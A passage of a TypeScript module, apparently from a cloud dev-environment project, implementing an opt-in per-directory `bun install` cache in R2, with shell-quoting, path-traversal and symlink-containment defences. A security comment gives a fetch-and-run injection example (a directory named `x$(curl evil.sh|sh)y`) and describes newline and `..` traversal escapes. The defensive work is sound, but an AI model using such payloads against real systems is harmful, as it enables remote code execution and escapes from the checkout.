// Per-repo `bun install` cache — board issue #350, design in the issue body.
//
// ONE repo pays for this today: example-org/websites measures a 623s cold
// `bun install --frozen-lockfile` against a 43s restore-then-install (#115's
// own measurement, quoted in #350). Every other repo in the fleet measures
// break-even or worse (one repo) or actively slower (another) — see
// docs/superpowers/specs/2026-09-25-build-cache-survival-design.md's own
// table for the sibling `.turbo`-cache feature, and #350's issue body for
// this feature's own numbers. So this is opt-in per repo, default OFF, and
// every repo not named in the gate gets ZERO new execs, ZERO R2 traffic, and
// ZERO behaviour change from before this module existed — see
// isInstallCacheRepo's own doc comment, and this module's two orchestration
// functions (runInstallCacheRestore, runInstallCacheSaveTick), both of which
// check the gate FIRST, before anything else.
//
// Transport: never through the DO. A `node_modules` tarball is 0.5-1.1 GiB
// (#350's own measurement) against a 128 MiB isolate (and issue #176 caps
// even SESSION tar reads, which top out around 32 MiB, well under this
// feature's own object sizes) — routing that through sbExec's base64
// read/write path the way session-restore does (provision.ts's
// runSessionRestore) would blow the isolate's heap on the very first
// container this feature ever touches. Instead the Worker mints a
// short-lived, SigV4-signed presigned URL against R2's S3-compatible API
// (presignR2 below) and the CONTAINER streams the whole transfer directly to
// R2 — a materialize-then-validate-then-move pipeline to restore (see
// installCacheRestoreCmd's own doc comment for why this is no longer a bare
// `curl | zstd -d | tar -x` pipe), the reverse to save — with the object's
// bytes never once touching the Worker/DO process.
//
// Bucket: the EXISTING STUDIO_ARCHIVE R2 bucket (its real name is
// operator config, see R2_BUCKET_NAME on Env) — `caches/` is a new key
// prefix inside it,
// parallel to whatever prefix session/transcript archives already use
// (archive.ts owns those; this file owns `caches/`, and the two never
// collide because neither prefix is a substring-prefix of the other). No new
// R2 bucket binding: this feature is disabled entirely until the maestro
// provisions three NEW secrets (an R2 API token, which is a DIFFERENT
// credential from the plain Workers R2Bucket binding STUDIO_ARCHIVE already
// uses — see presignR2's own doc comment for exactly which three and why the
// plain binding cannot mint a presigned URL by itself). That token should be
// scoped to ONLY the STUDIO_ARCHIVE bucket, not account-wide —
// this feature never needs to read or write any other bucket, and a
// bucket-scoped token limits the blast radius of a leaked secret or a bug in
// this file to the one bucket it already has plain-binding access to anyway.
//
// Repo gate shape (#350's own open question, decided here): a plain
// comma-separated list of full "owner/repo" slugs (INSTALL_CACHE_REPOS),
// NOT a JSON map keyed by repo segment the way issue #271's
// CLAUDE_ACCOUNT_BY_REPO or the sibling build-cache design's
// BUILD_CACHE_BY_REPO are. Those both need a per-repo VALUE (an account
// slot; a dirs+maxMiB config) and a JSON object is the natural shape for
// that. This feature needs only per-repo MEMBERSHIP — every gated repo gets
// the identical treatment (same size cap, same key format, same LRU depth)
// — so a flat list is the more honest shape for what's actually being
// configured today, and it costs nothing to migrate to a JSON map later if
// a second repo ever needs its own dirs/cap. It mirrors GITHUB_REPO_AUTH's
// own comma-separated-list convention (src/env.ts's doc comment on that
// var) more closely than #271's JSON map does, for the same reason: GitHub
// repo auth is also pure per-owner membership in a provider, not a per-owner
// value. Full "owner/repo" slugs, not the repo-id SEGMENT #271 keys on,
// because the cache key itself (installCacheKey below) needs the full slug
// to keep two different owners' same-named repos from ever colliding on one
// R2 key.
//
// ---------------------------------------------------------------------------
// Round 2 review (#350), item 1's redesign — PER-DIRECTORY caching, not one
// repo-wide cache object.
//
// The gate's own first target, example-org/websites, has NO root lockfile
// and NO root `node_modules` at all: it is eight independent sites, each its
// own directory with its own lockfile and its own `node_modules`. A single
// "hash the repo root, cache the repo root's node_modules" design (this
// file's shape before this section existed) is a complete, silent no-op for
// that repo — it hashes nothing, restores nothing, saves nothing, and never
// errors, so nothing short of reading this file would reveal that the
// feature was doing nothing at all for the one repo it was built for.
//
// Fixed by discovering every directory under the checkout that carries its
// own lockfile (discoverCacheDirsCmd/parseCacheDirs below) and treating each
// one as its own independent cache unit: its own hash
// (lockHashCmd/parseLockHash, unchanged, just called once per directory
// instead of once for the whole repo), its own R2 key
// (`caches/<repo>/<dirSlug>/<lockHash>.tar.zst` — installCacheKey below,
// now taking a dirSlug), its own LRU generation window
// (installCachePrefix, also dirSlug-scoped), its own "is this directory's
// install still running" guard (bunInstallRunningCmd). A repo with exactly
// one lockfile at its own root (every OTHER repo in the fleet, gated in or
// not) discovers exactly one directory — the root itself — so this is a
// strict generalization of the original single-cache design, not a parallel
// implementation of it: runInstallCacheRestore/runInstallCacheSaveTick's own
// signatures are UNCHANGED (still just a repoDir/workRepoSlug), and every
// existing single-lockfile-at-root repo gets identical behaviour to before,
// just reached through one iteration of a loop instead of a single inline
// path.
// ---------------------------------------------------------------------------

import { AwsClient } from "aws4fetch";
import { repoIdSegment } from "./repo";

// ---------------------------------------------------------------------------
// Repo gate
// ---------------------------------------------------------------------------

/** Parses `INSTALL_CACHE_REPOS` (comma-separated "owner/repo" slugs) into a
 *  lowercased list. Absent/empty -> no repos gated in, the safe default. No
 *  validation beyond trim+lowercase: an entry that can never match a studio's
 *  resolved work-repo slug (a typo, an owner that doesn't exist) simply never
 *  matches anything — silently inert, not a startup failure, matching this
 *  codebase's own posture for a var like GITHUB_REPO_AUTH that composes with
 *  arbitrary repo names it cannot validate ahead of time. */
export function parseInstallCacheRepos(raw: string | undefined): string[] {
  if (raw === undefined || raw.trim() === "") return [];
  return raw.split(",").map((s) => s.trim().toLowerCase()).filter((s) => s.length > 0);
}

/** The whole of the opt-in gate: is `workRepoSlug` (the resolved "owner/repo"
 *  a studio actually clones — provision.ts's resolveWorkRepoSlug) one of the
 *  repos INSTALL_CACHE_REPOS names? Case-insensitive (GitHub owner/repo names
 *  are case-insensitive — the same reasoning github/auth.ts's repoOwner
 *  lowercasing gives). This is the FIRST check both orchestration functions
 *  below make, before any exec or R2 call — a repo this returns false for
 *  gets exactly the same zero-new-behaviour treatment it had before this
 *  module existed. */
export function isInstallCacheRepo(raw: string | undefined, workRepoSlug: string): boolean {
  return parseInstallCacheRepos(raw).includes(workRepoSlug.toLowerCase());
}

// ---------------------------------------------------------------------------
// Repo checkout directory naming — round 2 review, smaller items: the
// restore side and the save side used to disagree about which on-disk
// directory a DOTTED repo name (`example-org/example.app`) lives in.
// ---------------------------------------------------------------------------

/**
 * The exact directory name a studio's checkout lives under, for a given
 * `workRepoSlug` — `/workspace/<this>`. MUST match provision.ts's own
 * `repo` value (`cfg.repo` on provision, `parseStudioId(status.id)?.repo` on
 * restart), because that is what `guardedCloneCmd` actually clones into.
 * Both of those are the studio id's own repo SEGMENT, which folds `.` and
 * `_` onto `-` (repo.ts's repoIdSegment, board #21/#5) — a studio for
 * `example-org/example.app` is `example-app--<role>` and clones into
 * `/workspace/example-app`, never `/workspace/example.app`.
 *
 * The restore side (runInstallCacheRestore) is handed `repoDir` directly by
 * provision.ts, built from that same segment, so it was never wrong. The
 * SAVE side (runInstallCacheSaveTick) used to build its own `repoDir` from
 * `workRepoSlug.split("/").pop()` with no fold at all — for
 * `example-org/example.app` that produced `/workspace/example.app`, a
 * directory that was never the real checkout (`/workspace/example-app`),
 * so `installCacheSaveCmd`'s own `[ -d .../node_modules ]` guard found
 * nothing and every save silently skipped forever on any dotted repo name.
 * Fixed by routing the save side through the SAME fold the clone target
 * itself uses, rather than a second, independent guess at it.
 *
 * Falls back to the raw (unfolded) short name when `repoIdSegment` refuses
 * it (empty string, or a name with no valid characters at all) — a repo
 * this feature is gated in for has, by construction, already been cloned
 * successfully under its folded segment at least once, so this branch is
 * unreachable in practice; it exists so this function never throws or
 * returns an empty string for a caller that hands it something unexpected.
 */
export function repoCheckoutDirName(workRepoSlug: string): string {
  const short = workRepoSlug.split("/").pop() ?? workRepoSlug;
  return repoIdSegment(short) ?? short;
}

// ---------------------------------------------------------------------------
// Key format + LRU prune — now keyed by (repo, dirSlug), not just repo.
// ---------------------------------------------------------------------------

/** `caches/<owner>/<repo>/<dirSlug>/<lockHash>.tar.zst` — shared by every
 *  studio of that repo whose OWN dirSlug/lockHash pair matches (any studio
 *  whose lockfile hash for that same directory matches may restore what a
 *  DIFFERENT studio's install first wrote for it), written by the first
 *  studio to install a new lockfile hash for that directory. `repoSlug`
 *  already contains its own "/" (owner/repo), so this reads as FOUR path
 *  segments under `caches/`, not three — a deliberate, honest rendering of
 *  what "<repo>" means in #350's own key-format literal (the design's
 *  shorthand for the full slug, not a bare repo name — see this file's
 *  header for why a bare name would collide across owners). `dirSlug` comes
 *  from `dirSlug()` below — never the raw directory path, which could carry
 *  characters R2/S3 keys don't like and would make two differently-named
 *  directories with a common prefix ambiguous to list. */
export function installCacheKey(repoSlug: string, dirSlug: string, lockHash: string): string {
  return `caches/${repoSlug.toLowerCase()}/${dirSlug}/${lockHash}.tar.zst`;
}

/** The prefix every cache object of one repo+directory lives under — what
 *  the LRU prune below lists to find every generation of that ONE
 *  directory's cache. Deliberately scoped to a single dirSlug, not the whole
 *  repo: two different directories' lockHash values are unrelated to each
 *  other (a monorepo of eight sites has eight independent histories of
 *  lockfile changes), so pruning them as one shared LRU window would evict a
 *  perfectly current generation of directory A because directory B happened
 *  to get more recent writes. */
export function installCachePrefix(repoSlug: string, dirSlug: string): string {
  return `caches/${repoSlug.toLowerCase()}/${dirSlug}/`;
}

/** How many lockfile-hash generations one (repo, directory) pair keeps at
 *  once. #350's own design: "LRU-prune to the newest 2 keys per repo" — read
 *  here as "per cached directory", the redesign's own unit of caching. */
export const INSTALL_CACHE_KEEP_GENERATIONS = 2;

/** Pure LRU-prune decision: given every object under one (repo, directory)
 *  cache prefix, which keys are stale (older than the newest `keep`) and
 *  should be deleted? Newest-first by `uploaded` (an R2 object's own
 *  last-write timestamp — a re-upload of an already-cached lockHash, unusual
 *  but possible, counts as freshly written). Deliberately pure and separate
 *  from any R2 call, the same "no I/O here" split archive.ts's header draws
 *  for its own pure key/rotation math. */
export function keysToPrune(
  objects: { key: string; uploaded: Date }[], keep: number = INSTALL_CACHE_KEEP_GENERATIONS,
): string[] {
  return [...objects]
    .sort((a, b) => b.uploaded.getTime() - a.uploaded.getTime())
    .slice(keep)
    .map((o) => o.key);
}

// ---------------------------------------------------------------------------
// Round 3 review, item 5 — SECURITY (shell command injection). Every command
// builder below takes a `dir`/`repoDir` value that ultimately traces back to
// a DIRECTORY NAME `discoverCacheDirsCmd`'s own `find` discovered on the
// checkout's filesystem — nominally attacker-controllable the moment an
// untrusted commit introduces an oddly-named directory that happens to carry
// a lockfile (e.g. a directory literally named `x$(curl evil.sh|sh)y`).
// Before this fix, every one of those values was interpolated RAW into the
// returned shell string (`cd ${dir}`, `${dir}/node_modules`, ...) — bash
// expands a `$(...)` or backtick substitution the moment it PARSES the
// command line, before `cd`/`tar`/whatever ever runs, so a directory name
// shaped like that executes arbitrary shell the instant any of these
// commands is built and run, independent of whether the rest of the command
// ever succeeds.
//
// Fixed by routing every interpolation through `shQuote`, POSIX single-
// quoting (not double-quoting — verified live in this sandbox: bash STILL
// expands `$(...)` and backticks inside double quotes, so `"${dir}"` alone
// would not have closed this hole at all; only single quotes suppress every
// expansion). The one escape single quotes themselves need — a literal `'`
// inside the value — is handled by the standard `'\''` trick (close the
// quoted string, emit an escaped literal quote, reopen it), which is what
// makes this safe for a value containing single quotes too, not just `$()`/
// backticks/spaces/semicolons/newlines. A quoted value concatenated directly
// against unquoted literal text this file controls (`${shQuote(dir)}/node_modules`)
// is safe: adjacent quoted/unquoted shell words concatenate into one token,
// and the literal suffix text is fixed, never attacker-influenced.
// ---------------------------------------------------------------------------

function shQuote(value: string): string {
  return "'" + value.replace(/'/g, "'\\''") + "'";
}

// ---------------------------------------------------------------------------
// Directory discovery — round 2 review, item 1's main redesign. Finds every
// directory under a checkout that is its OWN installable unit (carries its
// own lockfile, so `bun install`/`npm install`/etc run there would produce
// their own `node_modules`), not just the checkout root.
// ---------------------------------------------------------------------------

/**
 * Filenames that mark a directory as its OWN installable unit — deliberately
 * narrower than `LOCKFILE_CANDIDATES` below, which also lists `package.json`
 * as a HASHING fallback. `package.json` is NOT a discovery marker: a real
 * monorepo (pnpm/yarn/npm workspaces, Turborepo) has a `package.json` in
 * nearly every directory, almost none of which have their own `node_modules`
 * — a hoisted workspace installs ONCE, at the root, into ONE shared
 * `node_modules`. A directory with its OWN lockfile, by contrast, is
 * genuinely independent: `example-org/websites`, this feature's own first
 * target, is eight separate sites with no shared workspace tooling at all,
 * each with its own lockfile and its own `node_modules`. Covers bun's own
 * two lockfile shapes plus the three mainstream non-bun ones, so a repo that
 * mixes package managers across directories (plausible in a "grab bag of
 * sites" monorepo, unlike a single coordinated workspace) is still handled
 * generically rather than assuming every directory uses bun.
 */
export const WORKSPACE_LOCK_MARKERS = [
  "bun.lock", "bun.lockb", "package-lock.json", "yarn.lock", "pnpm-lock.yaml",
];

/**
 * Finds every directory under `repoDir` that directly contains one of
 * `WORKSPACE_LOCK_MARKERS`, printing each as a `find`-style relative path
 * (`.` for the root itself, `./apps/site-a` for a subdirectory), one per
 * line, deduplicated. `\( -name node_modules -o -name .git \) -prune`
 * excludes both from the walk entirely — without it, a PRIOR successful
 * install's own `node_modules` (which routinely vendors packages that ship
 * their OWN nested lockfiles) would be discovered as if it were a source
 * directory, and `.git`'s objects can coincidentally contain blobs shaped
 * like a lockfile from the repo's own history. `(cd <repoDir> && ...)` — a
 * subshell, same reasoning as lockHashCmd's own `cd` below: sbExec runs
 * every command in one long-lived container shell, and a bare `cd` would
 * leak into whatever this session runs next. `sort -u` both dedupes (two
 * different markers in the same directory, e.g. a leftover `yarn.lock`
 * beside a newer `bun.lock` mid-migration, must count as ONE directory) and
 * makes the result deterministic across runs, matching this file's earlier
 * "fixed argument order" reasoning for `lockHashCmd`.
 */
export function discoverCacheDirsCmd(repoDir: string): string {
  const nameTests = WORKSPACE_LOCK_MARKERS.map((m) => `-name '${m}'`).join(" -o ");
  return (
    `(cd ${shQuote(repoDir)} && find . \\( -name node_modules -o -name .git \\) -prune -o ` +
    `\\( ${nameTests} \\) -print | sed 's#/[^/]*$##' | sort -u)`
  );
}

/** Normalizes one `find`-style relative directory path into this module's
 *  own canonical form: no leading `./`, no trailing `/`, and the checkout
 *  ROOT itself (`find`'s own `.`) becomes the empty string — every other
 *  function in this file that takes a "directory" reads `""` as "the
 *  checkout root", never as "an unknown/missing directory" (that case is
 *  `null`/absence at the caller, not an empty string here). */
export function normalizeCacheDir(raw: string): string {
  const trimmed = raw.trim();
  if (trimmed === "" || trimmed === ".") return "";
  return trimmed.replace(/^\.\//, "").replace(/\/+$/, "");
}

// ---------------------------------------------------------------------------
// Round 4 review, item 3 — SECURITY (path traversal). `discoverCacheDirsCmd`'s
// stdout is one `find`-reported relative path per line; before this fix,
// `parseCacheDirs` trusted every line verbatim (once trimmed/normalized) as a
// safe relative directory. Two ways that trust was misplaced, both reported
// live by the maestro against a directory actually present on disk:
//
//   - a discovered directory whose NAME contains a literal newline byte (a
//     real, legal filename character on Linux — only `/` and NUL are
//     forbidden). `find -print` terminates each result with a newline, the
//     same byte the embedded one uses, so a directory named `x\n..` prints as
//     TWO apparent lines once this module's own `stdout.split("\n")` runs:
//     one spurious line holding everything up to the embedded newline, and a
//     second line reading exactly `..`. That second "directory" was never a
//     real entry on disk at all — it is an artifact of the split — yet
//     nothing before this fix distinguished it from a genuine `find` result.
//   - a discovered directory whose normalized form is, or CONTAINS, a `..`
//     path segment, or is itself absolute (a leading `/`) — `find .` run
//     under `(cd repoDir && ...)` should never legitimately print either
//     shape, but nothing enforced that; once such a string reaches
//     `absoluteCacheDir(repoDir, relDir)`, the resolved path lands OUTSIDE
//     `repoDir` entirely (`${repoDir}/..` is `repoDir`'s own parent), and
//     both the restore side (extracts INTO that escaped location) and the
//     save side (tars and uploads FROM it) operate outside the checkout this
//     feature is meant to ever touch. Measured live: a directory literally
//     named `x\n..` made discovery yield `..`, which then made the save path
//     upload `/workspace/outside/node_modules` under this repo's own cache
//     key, and the restore path write into `/workspace/outside` — a real,
//     exploitable escape from the checkout, not a theoretical one.
//
// Fixed by REJECTING (never silently renormalizing into something
// safe-looking) any parsed line whose value contains a `..` PATH SEGMENT
// (checked on the SPLIT-by-"/" form, not merely `.includes("..")` — a real
// directory legitimately named e.g. `foo..bar` contains the two-character
// substring ".." without being a traversal segment at all, and must still be
// accepted), a literal embedded newline (defensive — by the time a value
// reaches here `stdout.split("\n")` has already consumed every newline byte,
// so this can never actually be true for a value THIS function ever sees, but
// the check documents the invariant explicitly rather than relying on that
// implicitly), or a leading `/` (absolute). The newline-embedded-in-a-real-
// filename exploit above is closed not by this check directly but by the
// fact that its OWN symptom — a spurious extra line reading exactly `..` — is
// itself a `..` segment, so the existing segment check catches it without
// needing any newline-specific logic of its own.
// ---------------------------------------------------------------------------

/** True when `value` (a `parseCacheDirs` candidate, already trimmed) is safe
 *  to ever pass to `absoluteCacheDir` — see the SECURITY block above this
 *  function for the exploit this closes. */
function isSafeCacheDirCandidate(value: string): boolean {
  if (value.includes("\n")) return false;
  if (value.startsWith("/")) return false;
  return !value.split("/").some((segment) => segment === "..");
}

/** `discoverCacheDirsCmd`'s stdout, parsed into a sorted, deduplicated list
 *  of normalized relative directories (root, if discovered, always sorts
 *  first — the empty string precedes every non-empty one). Blank lines
 *  (a trailing newline, or the command finding nothing at all) are dropped
 *  rather than turned into a spurious root entry. Round 4 review, item 3:
 *  any candidate that fails `isSafeCacheDirCandidate` (a `..` segment, an
 *  absolute path, or — defensively — an embedded newline) is DROPPED, never
 *  normalized into something that merely looks safe — this is the actual
 *  security boundary between untrusted `find` output and every other
 *  function in this file that trusts a "directory" argument completely. */
export function parseCacheDirs(stdout: string): string[] {
  const seen = new Set<string>();
  for (const line of stdout.split("\n")) {
    const trimmed = line.trim();
    if (trimmed === "") continue;
    if (!isSafeCacheDirCandidate(trimmed)) continue;
    const norm = normalizeCacheDir(trimmed);
    if (!isSafeCacheDirCandidate(norm)) continue;
    seen.add(norm);
  }
  return [...seen].sort((a, b) => a.localeCompare(b));
}

/** The absolute, on-disk path a normalized relative directory names, given
 *  the checkout's own root — `repoDir` itself for the root (`""`), else
 *  `<repoDir>/<relDir>`. Every per-directory command below (nodeModulesPresentCmd,
 *  lockHashCmd, bunInstallRunningCmd, installCacheRestoreCmd,
 *  installCacheSaveCmd) takes one of THESE, not a bare relDir — they have no
 *  idea what the checkout root is, by design, so they stay identical whether
 *  called once against a repo's own root (every pre-redesign repo) or many
 *  times against a monorepo's subdirectories. */
export function absoluteCacheDir(repoDir: string, relDir: string): string {
  return relDir === "" ? repoDir : `${repoDir}/${relDir}`;
}

/**
 * Round 4 review, item 3's second, more robust layer: `parseCacheDirs`'s own
 * rejection (above) closes the reported exploit by refusing any DISCOVERED
 * STRING shaped like a traversal. It cannot close a narrower residual gap the
 * maestro named explicitly — a directory whose relative path contains no
 * ".." segment at all (so it sails through that check) but is ITSELF a
 * symlink planted inside the checkout that points somewhere else on the
 * container's filesystem entirely. Pure string math on the relative path can
 * never see that: `apps/site-a` looks identical whether it is a real
 * directory or a symlink to `/etc`. Only asking the real filesystem —
 * `realpath -m`, resolving every symlink in the path — can tell the
 * difference, which is why this is a shell FRAGMENT (prepended ahead of
 * whatever per-directory command this wraps), not a pure TypeScript check.
 *
 * `-m` (`--canonicalize-missing`) resolves as much of the path as exists and
 * treats the rest literally, so this never fails just because `dir` (or a
 * trailing component under it) doesn't exist yet on disk — the same
 * tolerance `installCacheRestoreCmd`'s own `mkdir -p` precondition already
 * assumes is fine to need. On containment failure this prints the
 * `unsafe-path` marker and exits the enclosing subshell (`exit 0` — a subshell
 * `exit` only ever ends THAT subshell, never the caller's own script, the
 * same scoping `bunInstallRunningCmd`'s own `(cd ... || { echo no; exit 0; })`
 * branch already relies on) BEFORE the wrapped command's own text ever runs,
 * so nothing downstream ever touches the escaped path at all. Wired in as the
 * very FIRST thing either orchestration function (`restoreOneDir`/
 * `saveOneDir`) does for a directory — ahead of `nodeModulesPresentCmd`/
 * `bunInstallRunningCmd`, themselves the first per-directory commands each
 * flow already ran — rather than as its own separate `sbExec` round trip, so
 * every existing per-directory call site still makes exactly the same NUMBER
 * of exec calls it always did.
 */
export function guardDirWithinRepo(repoDir: string, absDir: string, cmd: string): string {
  return (
    `(real_repo=$(realpath -m ${shQuote(repoDir)} 2>/dev/null); ` +
    `real_dir=$(realpath -m ${shQuote(absDir)} 2>/dev/null); ` +
    `case "$real_dir" in "$real_repo"|"$real_repo"/*) : ;; *) echo unsafe-path; exit 0 ;; esac; ` +
    cmd +
    `)`
  );
}

/**
 * A deterministic, collision-safe, filesystem/URL-safe slug for one
 * directory — the middle segment of `installCacheKey`. Two requirements
 * drove the shape:
 *
 *   - COLLISION-SAFE: a naive "replace `/` with `-`" scheme collides
 *     `apps/site-a` and `apps-site-a` (a directory literally named
 *     `apps-site-a` existing alongside a nested `apps/site-a` is unlikely
 *     but not impossible, and a cache-key collision is a correctness bug,
 *     not a cosmetic one — two unrelated directories restoring each other's
 *     `node_modules`). Guaranteed by hashing the FULL normalized path with
 *     SHA-256 (Workers' native Web Crypto, `crypto.subtle` — already a
 *     runtime dependency of this file via aws4fetch's own SigV4 HMAC, so
 *     this adds no new capability) and keeping enough of the digest that
 *     two different inputs colliding is cryptographically implausible, not
 *     merely unlikely.
 *   - READABLE: an operator staring at an R2 key listing or a Worker log
 *     line should be able to tell which directory a slug names without
 *     decoding anything. The hash ALONE would satisfy collision-safety but
 *     make every log line opaque, so a sanitized, truncated rendering of the
 *     path itself is kept as a prefix — a human hint, not the safety
 *     mechanism.
 *
 * The root directory (`""`) gets the fixed readable prefix `root` — every
 * pre-redesign repo (one lockfile, at its own root) produces exactly this
 * slug, so its cache key's shape is `caches/<repo>/root-<hash of "">/<lockHash>.tar.zst`,
 * a mechanical, stable rename of the pre-redesign
 * `caches/<repo>/<lockHash>.tar.zst` rather than an arbitrary new one.
 */
export async function dirSlug(relDir: string): Promise<string> {
  const norm = normalizeCacheDir(relDir);
  const readableSource = norm === "" ? "root" : norm.toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-+|-+$/g, "");
  const readable = (readableSource || "dir").slice(0, 48);
  const digest = await sha256Hex(norm);
  return `${readable}-${digest.slice(0, 12)}`;
}

async function sha256Hex(input: string): Promise<string> {
  const bytes = new TextEncoder().encode(input);
  const digestBuf = await crypto.subtle.digest("SHA-256", bytes);
  return [...new Uint8Array(digestBuf)].map((b) => b.toString(16).padStart(2, "0")).join("");
}

// ---------------------------------------------------------------------------
// Lockfile hash — computed IN the container (sha256sum), never by pulling
// lockfile bytes back to the Worker: the whole point of this feature is
// keeping large bytes off the Worker/DO process, and a lockfile round trip
// (however much smaller than node_modules) would be an unnecessary exception
// to that rule for a value the container can compute itself in one exec.
// ---------------------------------------------------------------------------

/** What a directory's OWN install actually consults, for hashing purposes.
 *  Superset of `WORKSPACE_LOCK_MARKERS` (the DISCOVERY markers above) plus
 *  `package.json` — package.json is not itself evidence that a directory is
 *  its own installable unit (see WORKSPACE_LOCK_MARKERS's own doc comment),
 *  but once a directory IS known to be one (because it has a real lockfile),
 *  hashing its package.json too is cheap defense against a lockfile that
 *  doesn't fully represent workspace membership on its own, or a repo on an
 *  older binary lockfile format this list doesn't otherwise recognize.
 *  `sha256sum` skips (stderr, not stdout) any file that doesn't exist, so a
 *  directory with only `bun.lock` and none of the others hashes cleanly
 *  without them. Fixed argument order, so the hash is reproducible run to
 *  run for the same on-disk state. */
export const LOCKFILE_CANDIDATES = [...WORKSPACE_LOCK_MARKERS, "package.json"];

const HEX64_RE = /^[0-9a-f]{64}$/;

/** sha256("") — what a naive "hash the listing of every candidate file"
 *  pipeline produces when literally zero candidates exist and their absence
 *  is silently swallowed (guarded `2>/dev/null`) rather than checked for.
 *  Refused explicitly below, independently of `lockHashCmd`'s own
 *  `[ -f ... ]` guard, so a hash arriving from ANY source that reduces to "I
 *  hashed nothing" can never be mistaken for a real lockfile identity —
 *  round 2 review, item 1(c), fixed at the source in the prior commit; kept
 *  here as the second, independent layer that fix's own doc comment
 *  describes. */
const EMPTY_INPUT_SHA256 = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855";

/**
 * One-liner: hash each candidate file that EXISTS in `dir` (checked with
 * `[ -f ... ]` first, round 2 review item 1(c) — a directory with none of
 * the candidates emits nothing on stdout, never a valid-shaped hash of
 * "nothing was hashed"), then hash THAT combined listing — a single, fixed-
 * width hex digest regardless of which candidates were present. `(cd <dir>
 * && ...)` — a subshell, same reasoning as `discoverCacheDirsCmd`'s own `cd`
 * above.
 */
export function lockHashCmd(dir: string): string {
  const files = LOCKFILE_CANDIDATES.join(" ");
  return (
    `(cd ${shQuote(dir)} && present=""; for f in ${files}; do [ -f "$f" ] && present="$present $f"; done; ` +
    `if [ -z "$present" ]; then :; else sha256sum $present | sha256sum | cut -d' ' -f1; fi)`
  );
}

/** `lockHashCmd`'s stdout, trimmed and validated as exactly 64 lowercase hex
 *  characters — `null` for anything else (a directory with none of the
 *  candidates emits empty stdout directly, refused by the regex;
 *  `EMPTY_INPUT_SHA256` is the second, independent refusal for a hash
 *  command that still manages to emit that exact value some other way; a
 *  truncated/garbled stdout from a killed or wedged exec also lands here,
 *  same refusal). */
export function parseLockHash(stdout: string): string | null {
  const trimmed = stdout.trim();
  if (!HEX64_RE.test(trimmed)) return null;
  if (trimmed === EMPTY_INPUT_SHA256) return null;
  return trimmed;
}

// ---------------------------------------------------------------------------
// Restore-side guard — mirrors provision.ts's CONTAINER_HAS_PROJECTS_CMD
// exactly: same "yes"/"no" shape, same reasoning (a directory's mere
// EXISTENCE is the one question that matters — a container already holding
// installed deps of its own must never have them clobbered by a restore,
// whatever put them there: a prior successful install, a prior restore, a
// lead's own manual `bun install`).
// ---------------------------------------------------------------------------

export function nodeModulesPresentCmd(dir: string): string {
  return `[ -d ${shQuote(dir)}/node_modules ] && echo yes || echo no`;
}

// ---------------------------------------------------------------------------
// Save-side guard — round 2 review, item 3: a save must never tar up a
// `node_modules` that a `bun install` (or npm/yarn/pnpm's own) is still
// actively writing into.
//
// Round 3 review, item 2: the ORIGINAL version of this guard (see git history
// for the exact text) matched on PROCESS ARGV — did any process with `dir` as
// its cwd have "install" somewhere in its command line? Measured to miss the
// overwhelming majority of real invocations: `bun i` (bun's own documented
// shorthand) and `npm ci` (npm's own "clean install" shorthand) and a bare
// `yarn` (installs with zero arguments, yarn classic's own default command)
// never contain the literal substring "install" anywhere in their argv at
// all — no regex over the command line, however broadened, covers a
// shorthand that never spells the word out. `bun install --cwd <dir>` run
// from a DIFFERENT working directory defeats the OTHER half of the old
// check (`/proc/<pid>/cwd` matching `dir` exactly) the same way: the
// installing process's real cwd is wherever it was launched from, not `dir`,
// even though `dir` is unambiguously what it is installing into. Board #350
// round 3 measured this as 3 of 400 files actually saved — the guard was
// false-negative (reports "not running" for a genuinely mid-flight install)
// on nearly every real invocation shape, which is the dangerous direction: a
// false negative here means tarring a `node_modules` an install is still
// writing into, producing a corrupted cache object shared with every other
// studio of the same repo.
//
// Fixed by dropping argv matching ENTIRELY (per-package-manager invocation
// shapes are an open-ended, losing enumeration — bun/npm/yarn/pnpm each keep
// adding their own shorthands) in favor of a package-manager-AGNOSTIC
// filesystem signal: is `dir/node_modules` still being actively WRITTEN TO
// right now? Two independent checks, either one being true means "running":
//
//   (a) RECENT WRITE ACTIVITY: any file under `node_modules` with an mtime
//       within the last `INSTALL_ACTIVITY_WINDOW_SECONDS` seconds. This is
//       true for essentially the entire EXTRACTION phase of any install
//       (the overwhelming majority of a large install's wall-clock time,
//       per #350's own 623s cold-install measurement on websites) — every
//       mainstream package manager continuously creates/writes files under
//       `node_modules` while extracting, regardless of what its own argv
//       happened to spell out.
//   (b) LOCKFILE NEWER THAN node_modules: any of `WORKSPACE_LOCK_MARKERS`
//       (the real lockfiles, not `package.json` — see that constant's own
//       doc comment) has an mtime NEWER than `node_modules` itself (or
//       `node_modules` doesn't exist yet at all). Every mainstream package
//       manager touches/writes its lockfile at or near the START of an
//       install (bun/npm/yarn/pnpm all resolve and record the dependency
//       graph before or during extraction) — so a lockfile newer than
//       node_modules's own last write is exactly the brief window (a) alone
//       would miss: an install that has JUST started, before its first
//       node_modules write has landed, or one that is momentarily paused
//       mid-resolution (a slow network fetch) rather than mid-extraction.
//
// Deliberately biased toward FALSE POSITIVES ("looks like it's still
// running" when it just finished) over false negatives, matching the "never
// tar mid-install" reasoning above: a false positive here costs one skipped
// sync tick (a retry 300s later, session-sync.ts's own cadence) on an
// already-finished install; a false negative risks a corrupted, permanently
// shared cache object. `find -newermt`/`-nt` are GNU extensions — already
// assumed elsewhere in this file (`stat -c%s` in installCacheSaveCmd is
// GNU-coreutils-specific the same way), consistent with this container's own
// base image.
// ---------------------------------------------------------------------------

/** How far back "recently written" reaches for the recent-activity check —
 *  generous relative to `sbExec`'s own per-call overhead, short enough that
 *  a genuinely finished install stops looking "running" well within one
 *  sync-tick cadence (session-sync.ts's 300s `SYNC_SESSION_SECONDS`). */
export const INSTALL_ACTIVITY_WINDOW_SECONDS = 30;

// ---------------------------------------------------------------------------
// Round 4 review, item 2 — the "lockfile newer than node_modules" half of
// this guard (component (b) above, `stale` in the pre-fix code: `[ "$f" -nt
// node_modules ]`) is ITSELF permanently, falsely true after a normal,
// complete install, not merely during one. Measured live against real bun
// 1.3.x: a package manager's own final step is writing its lockfile, which
// routinely lands a few milliseconds AFTER its last `node_modules` write —
// on a completed, healthy install, not a stuck one. Once that happens, `[ "$f"
// -nt node_modules ]` is true FOREVER (nothing ever touches either file
// again for an unchanged lockfile), so this guard reported "still running"
// for that directory on every subsequent tick, permanently — measured: 2 of
// 3 fresh installs stuck this way, one surviving a bump+restore+noop cycle
// stuck 32 seconds after the install had genuinely finished. The directory
// never got saved again.
//
